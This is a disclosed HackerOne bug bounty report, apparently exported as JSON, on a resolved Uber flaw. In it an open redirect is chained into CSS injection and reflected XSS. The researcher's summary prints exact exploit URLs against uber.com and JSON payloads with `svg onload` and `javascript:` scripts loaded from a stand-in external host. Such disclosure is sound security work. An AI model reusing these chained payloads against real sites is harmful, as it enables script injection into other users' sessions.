{
  "id": 125791,
  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xMjU3OTE=",
  "url": "https://hackerone.com/reports/125791",
  "title": "Reflected XSS via Unvalidated / Open Redirect in uber.com",
  "state": "Closed",
  "substate": "resolved",
  "readable_substate": "Resolved",
  "created_at": "2016-03-24T21:10:58.581Z",
  "submitted_at": "2016-03-24T21:10:58.581Z",
  "is_member_of_team?": false,
  "is_organization_group_member?": false,
  "reporter": {
    "disabled": false,
    "username": "mdv",
    "url": "/mdv",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/000/038/696/21beef0c831766fad769a95c8f2a66692c65dfc9_original.png/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1"
    },
    "is_me?": false,
    "cleared": false,
    "verified": true,
    "hackerone_triager": false,
    "hacker_mediation": false
  },
  "team": {
    "id": 314,
    "url": "https://hackerone.com/uber",
    "handle": "uber",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/000/000/314/24ea21370a71b18eafb5722d5855825ab622b5dd_original.png/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1",
      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/000/314/24ea21370a71b18eafb5722d5855825ab622b5dd_original.png/3f1ab5c6a9b6dadada1e6c8121700b884388bd0a43471fee1897a38ce57d0b2c"
    },
    "permissions": [],
    "submission_state": "open",
    "default_currency": "usd",
    "awards_miles": false,
    "offers_bounties": true,
    "state": "public_mode",
    "only_cleared_hackers": false,
    "pentest_feature_enabled?": false,
    "pentest_retesting_ends_at": null,
    "profile": {
      "name": "Uber",
      "twitter_handle": "",
      "website": "https://www.uber.com",
      "about": ""
    }
  },
  "has_bounty?": true,
  "can_view_team": true,
  "can_view_report": true,
  "is_external_bug": false,
  "is_published": false,
  "is_participant": false,
  "has_collaborators": false,
  "submitted_by_team_member": false,
  "submitted_with_assistant": false,
  "stage": 4,
  "public": true,
  "visibility": "full",
  "cve_ids": [],
  "singular_disclosure_disabled": true,
  "disclosed_at": "2016-05-09T22:29:33.306Z",
  "bug_reporter_agreed_on_going_public_at": "2016-04-13T08:57:19.286Z",
  "team_member_agreed_on_going_public_at": "2016-05-09T22:29:33.222Z",
  "comments_closed?": false,
  "facebook_team?": false,
  "team_private?": false,
  "vulnerability_information": "Hello,\nTo reproduce this issue, visit this URL: https://www.uber.com/en//example.com/\nThis URL will redirect at [example.com](https://example.com/).",
  "bounty_amount": "3000.0",
  "formatted_bounty": "$3,000",
  "original_report_id": null,
  "original_report_url": null,
  "attachments": [
    {
      "id": 81107,
      "file_name": "Response.png",
      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/081/107/834faa37742f57ab1afaf12dad30d67a30e7ec1f/Response.png?response-content-disposition=attachment%3B%20filename%3D%22Response.png%22%3B%20filename%2A%3DUTF-8%27%27Response.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQS3CCK3EE%2F20250922%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250922T135418Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEKX%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQDGKDX4%2FUfI4d2myjy8vMf8hEw8dVtxTJ5LFoqDdpn4qwIhAJ%2B50A5azGcUU1BLCs1qy2WRb83ufiX225jbbwbQq2RUKrIFCC4QAxoMMDEzNjE5Mjc0ODQ5IgxPV5RNMX9O2QjtLwgqjwWcQ%2BNQAG1gs7Q0G2KjprbpnjEjfth9zV1ZrHiIK%2BtVzvAsKhMnurqllOz84fl6aemDSnObvQ2oYSjqArlfe4c%2FwX2%2FRaQU9ZBsrITupqxu8GS5PM%2BBYT0gIZ9PbzYTueVWWOnMDhHClHSyVZLSywENSnQLDNhz%2BhnN%2FlLmLajuaHI2hpL5exU3ygTZloTEl%2Bi8YFB4TzfAOq4W6FPSTNddSuQwa4uQX6nKhrDe7GgGhK%2Fg9sERBkFcpaMxem7z8KZZM925lpcQj0NBT7JGQPauWnhzfwMEKHaCgJ9iYxy%2FHuFw6M213bRGOXUY6J%2F6297JnUjYWSSQuQLbcKDxM3WBNmZPIy2SAAypY4g5clAH4zruO4QLmL52C3bNfuldjTmYhAiO%2BRhgEgZuIOGxnupyqogrwRm5t0FHnFvLDVh1d%2BPcNKfNIINMdQfwYLWQ%2B7B84uW9Rc%2FjxBkviR1noduPTe3hzSlMjigxY1d8rkF6nrsucEjtnPqpSFTFprGViKuKmNWOKYOgi7srnpzWoTG%2BDRsJqmQ9O6l9fzagOS3AZnZ8julMI%2FFFblyFct2UM1jxIhPv%2F%2B9z4nRRkVNSW%2BVdfYVv8gq8bEjaxALJOmHjpvzaUsdgFrJvoi%2F4s2Ai9GGRy82wundHSShIq6EMCTg%2BDt5PMBtM%2FK5QoK9LNM%2FLiUdp4nC2bBDum8tkJeftmKtMfb3xExvw2fdVCkqML4Y72MUp84UVEMYdmk23Oy6casO62Ur1fycnqAEv77%2Bp3%2FDKJWr9p8P7vHSjr%2FT0cByO7zJkTenGzu1TN1%2B%2Fp2%2BrVJkysMUJ3F7qGyf%2F6kgCHkPi9k910dkY%2BUAHAYywSy5yps3%2BrEdXyV8TL5bKeVInMLyUxcYGOrABCfM07AtaTBWTrjyXz2xaFRa0NuyCNE2P2w5TBzdxN9o9QzuqLirMPdr%2F6olZ3pwp34vQgPcfX6BS0Sqfyc7c0l7e802rRspbxADiE5C61FprYQdpagSlZVNn0rY7CLDhEY%2BV3GipzXSDz6O5S%2BrMHGBGWCb815ggEo5HwJqz%2FED6izW0l%2B3mrsUTeDG5RFBsfNGCC%2F9xltHeY26k204Xn%2BhagcWCZREBCqwCLibBH7w%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=f97bdd571e7667fbc3b87ce935c887896c618c84e83c9047b6c14230edc602f3",
      "file_size": 13735,
      "type": "image/png",
      "moderated": null
    }
  ],
  "allow_singular_disclosure_at": "2016-05-13T08:57:19.375Z",
  "allow_singular_disclosure_after": -295419418.75888675,
  "singular_disclosure_allowed": true,
  "vote_count": 10,
  "voters": [
    "he4am",
    "fqdn",
    "spam404",
    "2026",
    "painxploiter",
    "dz_samir",
    "fantam1",
    "dyabla",
    "b35c90d99c67687f1bd2dd2",
    "pei"
  ],
  "structured_scope": null,
  "abilities": {
    "assignable_team_members": [],
    "assignable_team_member_groups": []
  },
  "summaries": [
    {
      "category": "team",
      "can_view?": true,
      "can_create?": false
    },
    {
      "id": 1899,
      "category": "researcher",
      "content": "This report demonstrates how much the usual Open Redirect can be dangerous.\n\n### Open Redirect\nOpen Redirect was reproduced from this URL: [uber.com/en//example.com/](https://www.uber.com/en//example.com/)\nResponse:\n\n```\nHTTP/1.1 301\n...\nLocation: //example.com/\n```\n\n### CSS injection\nThis vulnerability was reproduced via parameter `theme` from URL [uber.com/?theme=../en//example.com/css-code.css%23](https://www.uber.com/?theme=../en//example.com/css-code.css%23) as follow:\n```\n<link rel=\"stylesheet\" id=\"theme-css\" href=\"https://uber.com/stylesheets/../en//example.com/css-code.css#.css\">\n```\nBrowser try to load CSS code from: [example.com/css-code.css](https://example.com/css-code.css)\nTo fix @uber added whitelisting the theme names.\n\n### Reflected Cross-Site Scripting\nThis vulnerability was produced via insufficient filtration API requests.\n>Example URL to controlling API request: [uber.com/careers/list/-CONTROLLED-/](https://www.uber.com/careers/list/-CONTROLLED-/)\nBrowser try to load JSON content from: [uber.com/api/jobs/-CONTROLLED-](https://www.uber.com/api/jobs/-CONTROLLED-)\n>\nSending API requests to another domain: [uber.com/careers/list/..%2f..%2fen%2f%2fexample.com%2ffile.json/](https://www.uber.com/careers/list/..%2f..%2fen%2f%2fexample.com%2ffile.json/)\nBrowser try to load JSON content from: \n[uber.com/en//example.com/file.json](https://uber.com/en//example.com/file.json) >>> [example.com/file.json](https://example.com/file.json)\n\nSo, on a controlled domain, I placed a JSON file with this content:\n```\n{  \n   \"id\":\"9999\",\n   \"title\":\"XSS on Uber.com\",\n   \"overview\":\"<svg onload=\\\"alert('XSS on '+ document.domain)\\\">\",\n   \"responsibilities\":null,\n   \"qualifications\":null,\n   \"lastUpdated\":\"2016-01-16 06:29 AM\",\n   \"formattedTeam\":\"xss\",\n   \"team\":\"xss\",\n   \"subTeam\":\"xss\",\n   \"formattedLocation\":\"xss\",\n   \"slugs\":{  \n      \"team\":\"xss\",\n      \"subTeam\":\"xss\",\n      \"city\":\"xss\",\n      \"country\":\"xss\"\n   },\n   \"city\":\"xss\",\n   \"country\":\"xss\",\n   \"jobUrl\":\"javascript:alert('XSS on '+ document.domain)\",\n   \"normalizedTitle\":\"xss\",\n   \"normalizedContent\":\"xss\"\n}\n```\nand get unusually high degree of control over the page.\nThen I found a similar XSS vector on [uber.com/cities/%252e%252e%2f%252e%252e%2fen%2f%2fexample.com%2ffile.json/](https://www.uber.com/cities/%252e%252e%2f%252e%252e%2fen%2f%2fexample.com%2ffile.json/).\nBrowser try to load JSON content from: [example.com/file.json](https://example.com/file.json)\nVulnerable JSON  for [uber.com/cities/-CONTROLLED-/](https://www.uber.com/cities/-CONTROLLED-/):\n```\n{  \n   \"products\":[  \n      {  \n         \"productDisplayType\":\"uberx\",\n         \"fare\":{  \n            \"safeRideFee\":\"USD9999.99\",\n            \"perMinute\":\"USD9999.99\",\n            \"minimum\":\"USD9999.99\",\n            \"cancellation\":\"USD9999.99\",\n            \"fareType\":\"time_plus_distance\",\n            \"base\":\"USD9999.99\",\n            \"isDistanceUnitMetric\":false,\n            \"perDistanceUnit\":\"USD9999.99\",\n            \"additionalFees\":[  \n\n            ]\n         },\n         \"displayName\":\"uberX\",\n         \"tagline\":\"XSS\",\n         \"taxiFareInfo\":false,\n         \"finePrint\":[  \n            \"XSS\"\n         ]\n      },\n      {  \n         \"productDisplayType\":\"uberxl\",\n         \"fare\":{  \n            \"safeRideFee\":\"USD9999.99\",\n            \"perMinute\":\"USD9999.99\",\n            \"minimum\":\"USD9999.99\",\n            \"cancellation\":\"USD9999.99\",\n            \"fareType\":\"time_plus_distance\",\n            \"base\":\"USD9999.99\",\n            \"isDistanceUnitMetric\":false,\n            \"perDistanceUnit\":\"USD9999.99\",\n            \"additionalFees\":[  \n\n            ]\n         },\n         \"displayName\":\"uberXL\",\n         \"tagline\":\"XSS\",\n         \"taxiFareInfo\":false,\n         \"finePrint\":[  \n            \"XSS\"\n         ]\n      }\n   ],\n   \"flatRates\":[  \n\n   ],\n   \"id\":9999,\n   \"cityId\":9999,\n   \"flatRateDisplayNames\":[  \n\n   ],\n   \"geoJson\":null,\n   \"geoPoint\":{  \n      \"latitude\":33.951252,\n      \"longitude\":-83.382943\n   },\n   \"slug\":\"xss\",\n   \"twitterHandle\":null,\n   \"theme\":{  \n      \"name\":\"united_states\",\n      \"ctaColor\":\"#57AD57\",\n      \"patternColor\":\"#4DB5D9\",\n      \"patternColorBackground\":\"#A6DAEC\"\n   },\n   \"rideContent\":\"XSS\",\n   \"driveContent\":\"XSS\",\n   \"impactContent\":\"XSS\",\n   \"name\":\"<marquee>XSS</marquee><svg onload=\\\"alert('XSS on '+ document.domain)\\\">\",\n   \"pageTitle\":\"XSS\",\n   \"pageDescription\":\"XSS\",\n   \"productLegalNotice\":null,\n   \"pageConfiguration\":{  \n\n   }\n}\n```",
      "updated_at": "2022-02-19T14:14:54.181Z",
      "can_view?": true,
      "can_create?": false,
      "attachments": [],
      "user": {
        "id": 38696,
        "username": "mdv",
        "name": "",
        "bio": "",
        "cleared": false,
        "verified": true,
        "website": "https://twitter.com/phxxe",
        "location": "Ukraine",
        "created_at": "2015-08-19T10:29:28.856Z",
        "url": "https://hackerone.com/mdv",
        "hackerone_triager": false,
        "hackerone_employee": false,
        "user_type": "hacker",
        "profile_picture_urls": {
          "small": "https://profile-photos.hackerone-user-content.com/variants/000/038/696/21beef0c831766fad769a95c8f2a66692c65dfc9_original.png/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1",
          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/038/696/21beef0c831766fad769a95c8f2a66692c65dfc9_original.png/3f1ab5c6a9b6dadada1e6c8121700b884388bd0a43471fee1897a38ce57d0b2c",
          "xtralarge": "https://hackerone.com/rails/active_storage/representations/redirect/eyJfcmFpbHMiOnsiZGF0YSI6NTc2MiwicHVyIjoiYmxvYl9pZCJ9fQ==--9f1daaf37c3f6b80013ef4afb7968942d5bb0323/eyJfcmFpbHMiOnsiZGF0YSI6eyJmb3JtYXQiOiJwbmciLCJyZXNpemUiOiIyNjB4MjYwXHUwMDNlIn0sInB1ciI6InZhcmlhdGlvbiJ9fQ==--c155082ce6f9751dcb29cd6ea061a7e4d7329577/view24.png"
        }
      }
    }
  ]
}
